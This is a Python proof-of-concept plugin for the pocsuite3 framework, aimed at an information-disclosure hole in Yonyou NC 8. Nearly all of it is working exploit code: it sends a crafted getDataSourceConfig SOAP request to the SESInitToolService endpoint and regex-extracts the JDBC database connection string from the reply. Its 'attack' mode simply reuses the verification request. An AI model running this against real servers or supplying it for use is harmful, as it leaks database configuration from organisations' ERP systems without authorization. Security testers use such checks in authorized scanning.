#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import re


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友NC_SESInitToolService_info_disclosure'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''info-disclosure'''
    taskType = '''undetermined'''
    references = ['''''']
    appName = '''NC'''
    appVersion = '''8'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        data = """<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""
        vulurl = make_verify_url(self.url, '/uapws/service/nc.itf.ses.inittool.SESInitToolService', mod=0)
        resp = requests.post(vulurl, data=data, verify=False, timeout=20)
        if resp.content.find(b'getDataSourceConfigResponse') !=-1:
            re_result = re.findall(b'<return>jdbc:(.+?)</return>', resp.content)
            if len(re_result) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['port'] = port
                result['VerifyInfo']['Database'] = re_result[0].decode()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
